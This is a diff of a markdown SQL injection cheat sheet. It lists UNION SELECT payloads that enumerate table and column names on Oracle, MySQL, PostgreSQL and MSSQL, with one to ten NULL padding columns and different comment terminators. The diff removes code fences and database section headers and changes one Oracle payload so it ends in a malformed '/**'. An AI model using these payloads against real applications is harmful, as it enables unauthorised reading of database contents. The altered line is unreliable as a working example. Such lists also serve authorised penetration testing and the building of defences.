@@ -1,5 +1,4 @@
 ## Oracle — Tables (`--` comment)
-```sql
 ' UNION SELECT table_name FROM all_tables--
 ' UNION SELECT table_name,NULL FROM all_tables--
 ' UNION SELECT table_name,NULL,NULL FROM all_tables--
@@ -10,10 +9,7 @@
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM all_tables--
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM all_tables--
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM all_tables--
-```
-
 ## Oracle — Tables (`/**/` comment)
-```sql
 ' UNION SELECT table_name FROM all_tables/**/
 ' UNION SELECT table_name,NULL FROM all_tables/**/
 ' UNION SELECT table_name,NULL,NULL FROM all_tables/**/
@@ -24,10 +20,7 @@
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM all_tables/**/
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM all_tables/**/
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM all_tables/**/
-```
-
 ## Oracle — Columns (`--` comment)
-```sql
 ' UNION SELECT column_name FROM all_tab_columns WHERE table_name='TABLE_NAME_HERE'--
 ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='TABLE_NAME_HERE'--
 ' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='TABLE_NAME_HERE'--
@@ -38,10 +31,7 @@
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM all_tab_columns WHERE table_name='TABLE_NAME_HERE'--
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM all_tab_columns WHERE table_name='TABLE_NAME_HERE'--
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM all_tab_columns WHERE table_name='TABLE_NAME_HERE'--
-```
-
 ## Oracle — Columns (`/**/` comment)
-```sql
 ' UNION SELECT column_name FROM all_tab_columns WHERE table_name='TABLE_NAME_HERE'/**/
 ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='TABLE_NAME_HERE'/**/
 ' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='TABLE_NAME_HERE'/**/
@@ -51,22 +41,8 @@
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL FROM all_tab_columns WHERE table_name='TABLE_NAME_HERE'/**/
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM all_tab_columns WHERE table_name='TABLE_NAME_HERE'/**/
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM all_tab_columns WHERE table_name='TABLE_NAME_HERE'/**/
-' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM all_tab_columns WHERE table_name='TABLE_NAME_HERE'/**/
-```
-
-
----
-
-
-# MYSQL
-
-> MySQL supports `-- ` (with trailing space), `#`, and `/**/`.
-
-> Uses `information_schema.tables` / `information_schema.columns`.
-
-
+' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM all_tab_columns WHERE table_name='TABLE_NAME_HERE'/**
 ## MySQL — Tables (`-- ` comment, with trailing space)
-```sql
 ' UNION SELECT table_name FROM information_schema.tables-- 
 ' UNION SELECT table_name,NULL FROM information_schema.tables-- 
 ' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- 
@@ -77,10 +53,7 @@
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables-- 
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables-- 
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables-- 
-```
-
 ## MySQL — Tables (`#` comment)
-```sql
 ' UNION SELECT table_name FROM information_schema.tables#
 ' UNION SELECT table_name,NULL FROM information_schema.tables#
 ' UNION SELECT table_name,NULL,NULL FROM information_schema.tables#
@@ -91,10 +64,7 @@
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables#
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables#
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables#
-```
-
 ## MySQL — Tables (`/**/` comment)
-```sql
 ' UNION SELECT table_name FROM information_schema.tables/**/
 ' UNION SELECT table_name,NULL FROM information_schema.tables/**/
 ' UNION SELECT table_name,NULL,NULL FROM information_schema.tables/**/
@@ -105,10 +75,7 @@
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables/**/
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables/**/
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables/**/
-```
-
 ## MySQL — Columns (`-- ` comment, with trailing space)
-```sql
 ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'-- 
 ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'-- 
 ' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'-- 
@@ -119,10 +86,7 @@
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'-- 
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'-- 
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'-- 
-```
-
 ## MySQL — Columns (`#` comment)
-```sql
 ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'#
 ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'#
 ' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'#
@@ -133,10 +97,7 @@
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'#
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'#
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'#
-```
-
 ## MySQL — Columns (`/**/` comment)
-```sql
 ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'/**/
 ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'/**/
 ' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'/**/
@@ -147,19 +108,7 @@
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'/**/
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'/**/
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'/**/
-```
-
-
----
-
-
-# POSTGRESQL
-
-> PostgreSQL supports `--` and `/**/`. Does NOT support `#`.
-
-
 ## PostgreSQL — Tables (`--` comment)
-```sql
 ' UNION SELECT table_name FROM information_schema.tables--
 ' UNION SELECT table_name,NULL FROM information_schema.tables--
 ' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
@@ -170,10 +119,7 @@
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--
-```
-
 ## PostgreSQL — Tables (`/**/` comment)
-```sql
 ' UNION SELECT table_name FROM information_schema.tables/**/
 ' UNION SELECT table_name,NULL FROM information_schema.tables/**/
 ' UNION SELECT table_name,NULL,NULL FROM information_schema.tables/**/
@@ -184,10 +130,7 @@
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables/**/
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables/**/
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables/**/
-```
-
 ## PostgreSQL — Columns (`--` comment)
-```sql
 ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'--
 ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'--
 ' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'--
@@ -198,10 +141,7 @@
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'--
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'--
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'--
-```
-
 ## PostgreSQL — Columns (`/**/` comment)
-```sql
 ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'/**/
 ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'/**/
 ' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'/**/
@@ -212,19 +152,7 @@
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'/**/
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'/**/
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'/**/
-```
-
-
----
-
-
-# MICROSOFT SQL SERVER (MSSQL)
-
-> MSSQL supports `--` and `/**/`. Does NOT support `#`.
-
-
 ## MSSQL — Tables (`--` comment)
-```sql
 ' UNION SELECT table_name FROM information_schema.tables--
 ' UNION SELECT table_name,NULL FROM information_schema.tables--
 ' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
@@ -235,10 +163,7 @@
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--
-```
-
 ## MSSQL — Tables (`/**/` comment)
-```sql
 ' UNION SELECT table_name FROM information_schema.tables/**/
 ' UNION SELECT table_name,NULL FROM information_schema.tables/**/
 ' UNION SELECT table_name,NULL,NULL FROM information_schema.tables/**/
@@ -249,10 +174,7 @@
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables/**/
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables/**/
 ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables/**/
-```
-
 ## MSSQL — Columns (`--` comment)
-```sql
 ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'--
 ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'--
 ' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'--
@@ -263,10 +185,7 @@
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'--
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'--
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'--
-```
-
 ## MSSQL — Columns (`/**/` comment)
-```sql
 ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'/**/
 ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'/**/
 ' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'/**/
@@ -277,4 +196,3 @@
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'/**/
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'/**/
 ' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'/**/
-```
